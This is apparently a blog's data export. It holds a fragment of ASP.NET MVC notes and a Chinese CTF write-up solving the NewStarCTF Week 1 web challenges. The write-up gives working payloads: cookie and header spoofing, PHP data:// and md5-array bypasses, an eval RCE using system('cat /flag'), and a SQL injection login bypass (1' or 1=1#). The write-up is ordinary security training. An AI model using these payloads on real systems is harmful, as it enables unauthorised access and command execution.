<code>[EmailAddress]</code>：验证属性是否具有电子邮件格式。</p>\n<p>注：<code>[DataType]</code>：只是帮助字段进行格式设置，不提供任何验证</p>\n<h4 id=\"14-控制器方法的两个注解\"><a href=\"#14-控制器方法的两个注解\" class=\"headerlink\" title=\"14.控制器方法的两个注解\"></a>14.控制器方法的两个注解</h4><p>◼ <code>[HttpPost] 注解：</code>表明只能由POST请求才能调用此Action方法，不写默认[HttpGet] (第一个Create就是GET)</p>\n<p>◼ <code>[ValidateAntiForgeryToken] 注解：</code>用于防止请求伪造 (更安全)</p>\n<h4 id=\"15-强类型传值\"><a href=\"#15-强类型传值\" class=\"headerlink\" title=\"15.强类型传值\"></a>15.强类型传值</h4><p>◼ 回顾：ViewData字典传值是一个弱类型传值方式 (使用时需要手工强转类型)</p>\n<p>◼ 强类型传值则不需要手工强转类型</p>\n<p>◼ 如何实现强类型传值：</p>\n<pre><code>    ① 控制器在返回视图时，添加模型对象作为参数，即： return View(模型对象); \n\n    ② 在视图中，先使用 @model 指令声明模型对象类型\n\n    ③ 然后在视图中使用Model对象来接收传来的模型对象，之后使用Model对象无需强转\n</code></pre>\n<h4 id=\"16-控制器编程\"><a href=\"#16-控制器编程\" class=\"headerlink\" title=\"16.控制器编程\"></a>16.控制器编程</h4><p>给出数据库表，以及模型类、数据库上下文类，查询所有记录或根据 id 查明细。控制器基本结构：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MoviesController : Controller</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">private readonly MvcMovieContext _context;</span><br><span class=\"line\">public MoviesController(MvcMovieContext context)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">_context = context;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// …CRUD操作</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"NewStarCTF WEEK1 WEB","date":"2022-10-07T13:54:12.000Z","excerpt":"NewStarCTF WEEK1 WEB","_content":"\n\n\n# 1.HTTP\n\n![图片-1665405504740](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655204.png)\n\n进入题目发现要get name，我们猜测要用get的提交数据方式传一个值\n\nget传值公式为\n\n**?+变量名+等于号（=）+变量值**\n\n题目中的“name”添加了单引号，猜测变量名为name传入\n\n?name=1\n\n![图片-1665405531405](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655983.png)\n\n进入第二关，需要我们post一个key值，但我们不知道key\n\nF12进入开发者模式，html中藏了key值\n\n![图片-1665405550865](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655026.png)\n\n用post传参key=ctfisgood（post传参不会显示到url上面，并且并不需要用问号（？）\n\n![图片-1665405558353](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655803.png)\n\n用bp传入key=ctfisgood后，发现response说我们不是admin，\n\n我们看到cookie中显示user=guest，改为user=admin\n\n\n\n得到flag{ed52ca0c-40c7-4c7e-bfd7-d4f2cbbd2435}\n\n# 2.Head?Header!\n\n![图片-1665405589688](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656086.png)\n\n这里要我们将浏览器改为CTF，我们用bp抓一个包\n\n![图片-1665405599681](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656618.png)\n\n必须要求我们来自‘ctf.com'，这里用到了referer的知识点\n\n> Referer  是  HTTP  请求header 的一部分，当浏览器（或者模拟浏览器行为）向web 服务器发送请求的时候，头信息里有包含  Referer  。比如我在www.google.com 里有一个www.baidu.com 链接，那么点击这个www.baidu.com ，它的header 信息里就有：\n>\n> ```\n> Referer=http://www.google.com\n> ```\n>\n> 由此可以看出来吧。它就是表示一个来源。看下图的一个请求的 Referer  信息。\n\n[referer知识点](https://blog.csdn.net/shenqueying/article/details/79426884)\n\n我们加一行\n\n**referer:ctf.com**\n\n![图片-1665405614966](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656077.png)\n\n这里提示我们不是local，在php中有很多头能改来源常见的是X-Forward-For\n\n[X-Forwarded-For知识点](https://www.jianshu.com/p/15f3498a7fad)\n\n我们添加一行\n\n**X-Fordward-For:127.0.0.1**\n\n127.0.0.1就是本地地址\n\n![图片-1665405624087](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656892.png)\n\n得到flag{d0637815-c4fc-4aa4-a842-06ebfc22817b}\n\n# 3.我真的会谢\n\n![图片-1665405631706](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657077.png)\n\nflag放在三个地方，都是敏感文件\n\n一般常见的有\n\nrobots.txt .index.php.swp www.zip index.php~ 还有很多可以自行查询\n\n题目这里是robots.txt .index.php.swp www.zip\n\n![图片-1665405645261](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657703.png)\n\n![图片-1665405650443](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657351.png)\n![图片-1665405656120](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657336.png)\n\n得到flag\n\n正常情况下我们用dirsearch就可以扫出来，不过buu这里不支持\n\n# 4.NotPHP\n\n```php\n <?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(file_get_contents($_GET['data']) == \"Welcome to CTF\"){\n    if(md5($_GET['key1']) === md5($_GET['key2']) && $_GET['key1'] !== $_GET['key2']){\n        if(!is_numeric($_POST['num']) && intval($_POST['num']) == 2077){\n            echo \"Hack Me\";\n            eval(\"#\".$_GET['cmd']);\n        }else{\n            die(\"Number error!\");\n        }\n    }else{\n        die(\"Wrong Key!\");\n    }\n}else{\n    die(\"Pass it!\");\n} Pass it!\n```\n\n是一道php代码审计题目一共有四关\n\n第一关\n\n```php\nif(file_get_contents($_GET['data']) == \"Welcome to CTF\")\n```\n\n这里给出相关知识点[file_get_contents相关知识点](https://blog.csdn.net/qq_45290991/article/details/113852174)\n\n[php伪协议](https://www.cnblogs.com/linfangnan/p/13535097.html)\n\n这里我们用data协议写入\n\n```php\n?data=data://text/plain,Welcome to CTF\n```\n\n接着第二关\n\n```php\n要求我们if(md5($_GET['key1']) === md5($_GET['key2']) && $_GET['key1'] !== $_GET['key2'])\n```\n\n这里要求key1和key2的md5值相同但key1和key2不相等，乍一看觉得很奇怪，但其实md5可以绕过\n\n[md5绕过](https://bbs.huaweicloud.com/blogs/319030#:~:text=%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%20md5%E4%B8%8D%E8%83%BD%E5%8A%A0%E5%AF%86%E6%95%B0%E7%BB%84%2C%E4%BC%A0%E5%85%A5%E6%95%B0%E7%BB%84%E4%BC%9A%E6%8A%A5%E9%94%99%2C%E4%BD%86%E4%BC%9A%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%E5%B9%B6%E4%B8%94%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E4%B8%BAnull%20%E6%AF%94%E5%A6%82%E5%B0%86%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84md5%E5%80%BC%E8%BF%9B%E8%A1%8C%E6%AF%94%E8%BE%83,md5%28a%5B%5D%3D1%29%20%3D%3D%3D%20md5%28b%5B%5D%3D1%29%20%E7%94%B1%E4%BA%8Emd5%E5%87%BD%E6%95%B0%E6%97%A0%E6%B3%95%E5%A4%84%E7%90%86%E6%95%B0%E7%BB%84%2C%E4%BC%9A%E8%BF%94%E5%9B%9Enull%2C%E6%89%80%E4%BB%A5md5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84%E7%BB%93%E6%9E%9C%E6%98%AF%E4%B8%8B%E9%9D%A2%E8%BF%99%E6%A0%B7)\n\n当我们让key1和key2为数组的时候，md5加密后，结果均为0，则0===0成立\n\n```php\nkey1[]=1&key2[]=2\n```\n\n第三关\n\n```php\nif(!is_numeric($_POST['num']) && intval($_POST['num']) == 2077)\n```\n\nis_numeric函数用来判断是否为数字\n\nintval() 函数用于获取变量的整数值。\n\n这里我们需要让num不是数字但让num=2077，这里需要注意这里用到的是==\n\n这是弱类型比较，则我们传入num=2077a\n\n```php\nnum=2077a\n```\n\nintval(2077a)=2077可以在自己实验一下\n\n第四关\n\n```php\neval(\"#\".$_GET['cmd']);\n```\n\n简单的rce，难点在于这个#注释\n\n有两种绕过方式\n\n1.?>让前面闭合\n\n2.%0a用换行来绕过\n\n经测试发现空格被过滤 我这利用%20绕过，还有许多绕过方式，自行搜索\n\n```php\n&cmd=%0asystem('cat%20/flag');\n```\n\n```php\n&cmd=?><?system('cat%20/flag');\n```\n\n得到flag{cd5e5ad9-1861-4bda-bcd5-bc729f7f953c}\n\n# 5.Word-For-You\n\n![图片-1665405676352](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657645.png)\n\n看着像sql注入猜一波万能密码\n\n```\n1' or 1=1#\n```\n\n![图片-1665405683499](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657484.png)\n\n直接出，这里给一个sql注入学习链接\n\n[sql注入](https://blog.csdn.net/yujia_666/article/details/90296495?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166429318116782427488623%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166429318116782427488623&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-90296495-null-null.142^v50^pc_rank_34_1,201^v3^add_ask&utm_term=sql%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187)\n\n<br/>\n\n<br/>\n\n第一周做完了，题目还算比较简单，这段时间充实下自己吧","source":"_posts/NewStarCTF WEEK1 WEB.md","raw":"---\ntitle: NewStarCTF WEEK1 WEB\ndate: 2022-10-07 21:54:12\nexcerpt: NewStarCTF WEEK1 WEB\ncategories: 复现\n---\n\n\n\n# 1.HTTP\n\n![图片-1665405504740](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655204.png)\n\n进入题目发现要get name，我们猜测要用get的提交数据方式传一个值\n\nget传值公式为\n\n**?+变量名+等于号（=）+变量值**\n\n题目中的“name”添加了单引号，猜测变量名为name传入\n\n?name=1\n\n![图片-1665405531405](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655983.png)\n\n进入第二关，需要我们post一个key值，但我们不知道key\n\nF12进入开发者模式，html中藏了key值\n\n![图片-1665405550865](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655026.png)\n\n用post传参key=ctfisgood（post传参不会显示到url上面，并且并不需要用问号（？）\n\n![图片-1665405558353](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655803.png)\n\n用bp传入key=ctfisgood后，发现response说我们不是admin，\n\n我们看到cookie中显示user=guest，改为user=admin\n\n\n\n得到flag{ed52ca0c-40c7-4c7e-bfd7-d4f2cbbd2435}\n\n# 2.Head?Header!\n\n![图片-1665405589688](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656086.png)\n\n这里要我们将浏览器改为CTF，我们用bp抓一个包\n\n![图片-1665405599681](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656618.png)\n\n必须要求我们来自‘ctf.com'，这里用到了referer的知识点\n\n> Referer  是  HTTP  请求header 的一部分，当浏览器（或者模拟浏览器行为）向web 服务器发送请求的时候，头信息里有包含  Referer  。比如我在www.google.com 里有一个www.baidu.com 链接，那么点击这个www.baidu.com ，它的header 信息里就有：\n>\n> ```\n> Referer=http://www.google.com\n> ```\n>\n> 由此可以看出来吧。它就是表示一个来源。看下图的一个请求的 Referer  信息。\n\n[referer知识点](https://blog.csdn.net/shenqueying/article/details/79426884)\n\n我们加一行\n\n**referer:ctf.com**\n\n![图片-1665405614966](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656077.png)\n\n这里提示我们不是local，在php中有很多头能改来源常见的是X-Forward-For\n\n[X-Forwarded-For知识点](https://www.jianshu.com/p/15f3498a7fad)\n\n我们添加一行\n\n**X-Fordward-For:127.0.0.1**\n\n127.0.0.1就是本地地址\n\n![图片-1665405624087](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656892.png)\n\n得到flag{d0637815-c4fc-4aa4-a842-06ebfc22817b}\n\n# 3.我真的会谢\n\n![图片-1665405631706](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657077.png)\n\nflag放在三个地方，都是敏感文件\n\n一般常见的有\n\nrobots.txt .index.php.swp www.zip index.php~ 还有很多可以自行查询\n\n题目这里是robots.txt .index.php.swp www.zip\n\n![图片-1665405645261](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657703.png)\n\n![图片-1665405650443](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657351.png)\n![图片-1665405656120](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657336.png)\n\n得到flag\n\n正常情况下我们用dirsearch就可以扫出来，不过buu这里不支持\n\n# 4.NotPHP\n\n```php\n <?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(file_get_contents($_GET['data']) == \"Welcome to CTF\"){\n    if(md5($_GET['key1']) === md5($_GET['key2']) && $_GET['key1'] !== $_GET['key2']){\n        if(!is_numeric($_POST['num']) && intval($_POST['num']) == 2077){\n            echo \"Hack Me\";\n            eval(\"#\".$_GET['cmd']);\n        }else{\n            die(\"Number error!\");\n        }\n    }else{\n        die(\"Wrong Key!\");\n    }\n}else{\n    die(\"Pass it!\");\n} Pass it!\n```\n\n是一道php代码审计题目一共有四关\n\n第一关\n\n```php\nif(file_get_contents($_GET['data']) == \"Welcome to CTF\")\n```\n\n这里给出相关知识点[file_get_contents相关知识点](https://blog.csdn.net/qq_45290991/article/details/113852174)\n\n[php伪协议](https://www.cnblogs.com/linfangnan/p/13535097.html)\n\n这里我们用data协议写入\n\n```php\n?data=data://text/plain,Welcome to CTF\n```\n\n接着第二关\n\n```php\n要求我们if(md5($_GET['key1']) === md5($_GET['key2']) && $_GET['key1'] !== $_GET['key2'])\n```\n\n这里要求key1和key2的md5值相同但key1和key2不相等，乍一看觉得很奇怪，但其实md5可以绕过\n\n[md5绕过](https://bbs.huaweicloud.com/blogs/319030#:~:text=%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%20md5%E4%B8%8D%E8%83%BD%E5%8A%A0%E5%AF%86%E6%95%B0%E7%BB%84%2C%E4%BC%A0%E5%85%A5%E6%95%B0%E7%BB%84%E4%BC%9A%E6%8A%A5%E9%94%99%2C%E4%BD%86%E4%BC%9A%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%E5%B9%B6%E4%B8%94%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E4%B8%BAnull%20%E6%AF%94%E5%A6%82%E5%B0%86%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84md5%E5%80%BC%E8%BF%9B%E8%A1%8C%E6%AF%94%E8%BE%83,md5%28a%5B%5D%3D1%29%20%3D%3D%3D%20md5%28b%5B%5D%3D1%29%20%E7%94%B1%E4%BA%8Emd5%E5%87%BD%E6%95%B0%E6%97%A0%E6%B3%95%E5%A4%84%E7%90%86%E6%95%B0%E7%BB%84%2C%E4%BC%9A%E8%BF%94%E5%9B%9Enull%2C%E6%89%80%E4%BB%A5md5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84%E7%BB%93%E6%9E%9C%E6%98%AF%E4%B8%8B%E9%9D%A2%E8%BF%99%E6%A0%B7)\n\n当我们让key1和key2为数组的时候，md5加密后，结果均为0，则0===0成立\n\n```php\nkey1[]=1&key2[]=2\n```\n\n第三关\n\n```php\nif(!is_numeric($_POST['num']) && intval($_POST['num']) == 2077)\n```\n\nis_numeric函数用来判断是否为数字\n\nintval() 函数用于获取变量的整数值。\n\n这里我们需要让num不是数字但让num=2077，这里需要注意这里用到的是==\n\n这是弱类型比较，则我们传入num=2077a\n\n```php\nnum=2077a\n```\n\nintval(2077a)=2077可以在自己实验一下\n\n第四关\n\n```php\neval(\"#\".$_GET['cmd']);\n```\n\n简单的rce，难点在于这个#注释\n\n有两种绕过方式\n\n1.?>让前面闭合\n\n2.%0a用换行来绕过\n\n经测试发现空格被过滤 我这利用%20绕过，还有许多绕过方式，自行搜索\n\n```php\n&cmd=%0asystem('cat%20/flag');\n```\n\n```php\n&cmd=?><?system('cat%20/flag');\n```\n\n得到flag{cd5e5ad9-1861-4bda-bcd5-bc729f7f953c}\n\n# 5.Word-For-You\n\n![图片-1665405676352](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657645.png)\n\n看着像sql注入猜一波万能密码\n\n```\n1' or 1=1#\n```\n\n![图片-1665405683499](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657484.png)\n\n直接出，这里给一个sql注入学习链接\n\n[sql注入](https://blog.csdn.net/yujia_666/article/details/90296495?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166429318116782427488623%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166429318116782427488623&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-90296495-null-null.142^v50^pc_rank_34_1,201^v3^add_ask&utm_term=sql%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187)\n\n<br/>\n\n<br/>\n\n第一周做完了，题目还算比较简单，这段时间充实下自己吧","slug":"NewStarCTF WEEK1 WEB","published":1,"updated":"2024-04-17T08:42:59.614Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7ib0005h776cqcn18a7","content":"<h1 id=\"1-HTTP\"><a href=\"#1-HTTP\" class=\"headerlink\" title=\"1.HTTP\"></a>1.HTTP</h1><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655204.png\"\n                        alt=\"图片-1665405504740\"\n                 ></p>\n<p>进入题目发现要get name，我们猜测要用get的提交数据方式传一个值</p>\n<p>get传值公式为</p>\n<p><strong>?+变量名+等于号（&#x3D;）+变量值</strong></p>\n<p>题目中的“name”添加了单引号，猜测变量名为name传入</p>\n<p>?name&#x3D;1</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655983.png\"\n                        alt=\"图片-1665405531405\"\n                 ></p>\n<p>进入第二关，需要我们post一个key值，但我们不知道key</p>\n<p>F12进入开发者模式，html中藏了key值</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655026.png\"\n                        alt=\"图片-1665405550865\"\n                 ></p>\n<p>用post传参key&#x3D;ctfisgood（post传参不会显示到url上面，并且并不需要用问号（？）</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655803.png\"\n                        alt=\"图片-1665405558353\"\n                 ></p>\n<p>用bp传入key&#x3D;ctfisgood后，发现response说我们不是admin，</p>\n<p>我们看到cookie中显示user&#x3D;guest，改为user&#x3D;admin</p>\n<p>得到flag{ed52ca0c-40c7-4c7e-bfd7-d4f2cbbd2435}</p>\n<h1 id=\"2-Head-Header\"><a href=\"#2-Head-Header\" class=\"headerlink\" title=\"2.Head?Header!\"></a>2.Head?Header!</h1><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656086.png\"\n                        alt=\"图片-1665405589688\"\n                 ></p>\n<p>这里要我们将浏览器改为CTF，我们用bp抓一个包</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656618.png\"\n                        alt=\"图片-1665405599681\"\n                 ></p>\n<p>必须要求我们来自‘ctf.com’，这里用到了referer的知识点</p>\n<blockquote>\n<p>Referer  是  HTTP  请求header 的一部分，当浏览器（或者模拟浏览器行为）向web 服务器发送请求的时候，头信息里有包含  Referer  。比如我在<a class=\"link\"   href=\"http://www.google.com/\" >www.google.com<i class=\"fas fa-external-link-alt\"></i></a> 里有一个<a class=\"link\"   href=\"http://www.baidu.com/\" >www.baidu.com<i class=\"fas fa-external-link-alt\"></i></a> 链接，那么点击这个<a class=\"link\"   href=\"http://www.baidu.com/\" >www.baidu.com<i class=\"fas fa-external-link-alt\"></i></a> ，它的header 信息里就有：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Referer=http://www.google.com</span><br></pre></td></tr></table></figure>\n\n<p>由此可以看出来吧。它就是表示一个来源。看下图的一个请求的 Referer  信息。</p>\n</blockquote>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/shenqueying/article/details/79426884\" >referer知识点<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>我们加一行</p>\n<p><strong>referer:ctf.com</strong></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656077.png\"\n                        alt=\"图片-1665405614966\"\n                 ></p>\n<p>这里提示我们不是local，在php中有很多头能改来源常见的是X-Forward-For</p>\n<p><a class=\"link\"   href=\"https://www.jianshu.com/p/15f3498a7fad\" >X-Forwarded-For知识点<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>我们添加一行</p>\n<p><strong>X-Fordward-For:127.0.0.1</strong></p>\n<p>127.0.0.1就是本地地址</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656892.png\"\n                        alt=\"图片-1665405624087\"\n                 ></p>\n<p>得到flag{d0637815-c4fc-4aa4-a842-06ebfc22817b}</p>\n<h1 id=\"3-我真的会谢\"><a href=\"#3-我真的会谢\" class=\"headerlink\" title=\"3.我真的会谢\"></a>3.我真的会谢</h1><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657077.png\"\n                        alt=\"图片-1665405631706\"\n                 ></p>\n<p>flag放在三个地方，都是敏感文件</p>\n<p>一般常见的有</p>\n<p>robots.txt .index.php.swp <a class=\"link\"   href=\"http://www.zip/\" >www.zip<i class=\"fas fa-external-link-alt\"></i></a> index.php~ 还有很多可以自行查询</p>\n<p>题目这里是robots.txt .index.php.swp <a class=\"link\"   href=\"http://www.zip/\" >www.zip<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657703.png\"\n                        alt=\"图片-1665405645261\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657351.png\"\n                        alt=\"图片-1665405650443\"\n                 ><br><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657336.png\"\n                        alt=\"图片-1665405656120\"\n                 ></p>\n<p>得到flag</p>\n<p>正常情况下我们用dirsearch就可以扫出来，不过buu这里不支持</p>\n<h1 id=\"4-NotPHP\"><a href=\"#4-NotPHP\" class=\"headerlink\" title=\"4.NotPHP\"></a>4.NotPHP</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;data&#x27;</span>]) == <span class=\"string\">&quot;Welcome to CTF&quot;</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>]) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>]) &amp;&amp; <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>] !== <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>])&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) == <span class=\"number\">2077</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Hack Me&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">eval</span>(<span class=\"string\">&quot;#&quot;</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Number error!&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Wrong Key!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Pass it!&quot;</span>);</span><br><span class=\"line\">&#125; Pass it!</span><br></pre></td></tr></table></figure>\n\n<p>是一道php代码审计题目一共有四关</p>\n<p>第一关</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;data&#x27;</span>]) == <span class=\"string\">&quot;Welcome to CTF&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>这里给出相关知识点<a class=\"link\"   href=\"https://blog.csdn.net/qq_45290991/article/details/113852174\" >file_get_contents相关知识点<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/linfangnan/p/13535097.html\" >php伪协议<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>这里我们用data协议写入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?data=data:<span class=\"comment\">//text/plain,Welcome to CTF</span></span><br></pre></td></tr></table></figure>\n\n<p>接着第二关</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">要求我们<span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>]) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>]) &amp;&amp; <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>] !== <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>])</span><br></pre></td></tr></table></figure>\n\n<p>这里要求key1和key2的md5值相同但key1和key2不相等，乍一看觉得很奇怪，但其实md5可以绕过</p>\n<p><a class=\"link\"   